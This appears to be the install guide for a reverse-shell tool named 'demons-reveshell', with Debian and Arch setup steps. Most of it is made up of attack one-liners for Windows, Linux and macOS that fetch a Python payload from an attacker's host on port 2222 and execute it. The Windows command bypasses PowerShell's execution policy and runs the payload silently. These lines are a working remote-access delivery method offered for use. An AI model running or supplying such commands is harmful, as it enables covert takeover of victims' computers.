DEBIAN
$ sudo apt-get install python3 python3-pip git
$ cd /opt/
$ sudo git clone https://github.com/Demonjokerwarrior/demons-reveshell
$ cd /demons-reveshell
$ pip3 install -r requirements.txt
$ sudo chmod +x demon
$ sudo cp demon /usr/bin/



 ARCH
 $ sudo pacman -S python python-pip git
$ cd /opt/
$ sudo git clone https://github.com/Demonjokerwarrior/demons-reveshell
$ cd demonReverseShell/
$ pip3 install -r requirements.txt
$ sudo chmod +x demon
$ sudo cp demon /usr/bin/


WINDOWS

cmd.exe /k powershell -NoProfile -ExecutionPolicy Bypass -Command "$url = 'http://{yourip addr}:2222/{yourfilename}'; $destination = [System.IO.Path]::Combine($env:USERPROFILE, 'Documents', {'yourfilename}.py'); Invoke-WebRequest -Uri $url -OutFile $destination; Start-Process -FilePath 'pythonw.exe' -ArgumentList $destination -NoNewWindow"



LINUX
wget -O "$HOME/Documents/script.py" "http://192.168.1.10:2222/script.py" && python3 "$HOME/Documents/script.py"


MAC OS
curl -o "$HOME/Documents/script.py" "http://192.168.1.10:2222/script.py" && python3 "$HOME/Documents/script.py"


ANDRIOD,IOS;

you need pyroid app and use to compile the code and save it and run it 






